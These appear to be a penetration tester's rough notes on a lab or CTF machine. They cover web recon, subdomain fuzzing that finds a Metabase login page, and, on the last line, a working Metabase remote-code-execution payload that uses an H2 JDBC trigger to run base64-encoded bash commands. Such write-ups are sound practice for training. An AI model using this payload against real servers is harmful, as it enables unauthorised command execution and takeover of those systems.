on invetigating the port 80 found a simple webpage 

>- Also found a fancybox jqery llibrary of javascript which s=help in zooming media like phtotos,videos etc...but found no exploit 

# So tried moving to subdomain fuzzing and found a data domain

![[../../windows box/jab/attachment/Pasted image 20240322131402.png]]

# there found a metabase login page

![[../../windows box/jab/attachment/Pasted image 20240322131435.png]]













![[../../windows box/jab/attachment/Pasted image 20240322140031.png]]

"db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command)